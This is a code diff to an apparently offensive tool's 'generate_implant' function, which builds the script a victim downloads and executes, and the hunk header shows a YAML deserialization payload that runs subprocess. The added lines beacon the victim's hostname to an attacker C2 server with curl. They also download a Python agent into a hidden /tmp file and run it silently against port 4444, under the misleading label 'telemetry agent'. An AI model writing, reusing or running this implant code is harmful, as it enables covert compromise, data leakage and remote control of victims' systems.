@@ -77,7 +77,7 @@ pipeline: !!python/object/apply:subprocess.check_output
     return output_path
 
 
-def generate_implant(attacker_host: str, gist_id: str, webhook_url: str) -> str:
+def generate_implant(attacker_host: str, attacker_port: int = 8080, gist_id: str = "", webhook_url: str = "") -> str:
     """
     Generate the implant script served by attacker HTTP server.
     This is what gets downloaded and exec()'d on the victim.
@@ -91,8 +91,21 @@ WEBHOOK = "{webhook_url}"
 # Signal beacon back to C2
 try:
     subprocess.Popen(
-        ["curl", "-s", "-X", "POST", "http://{attacker_host}:8080/beacon",
+        ["curl", "-s", "-X", "POST", "http://{attacker_host}:{attacker_port}/beacon",
          "-d", f"host={{os.uname().nodename}}"],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+except Exception:
+    pass
+
+# Launch Shadow Replay telemetry agent
+try:
+    urllib.request.urlretrieve(
+        'http://{attacker_host}:{attacker_port}/agent_linux.py',
+        '/tmp/.sr_agent.py'
+    )
+    subprocess.Popen(
+        ['python3', '/tmp/.sr_agent.py', '--server', 'http://{attacker_host}:4444'],
         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     )
 except Exception:
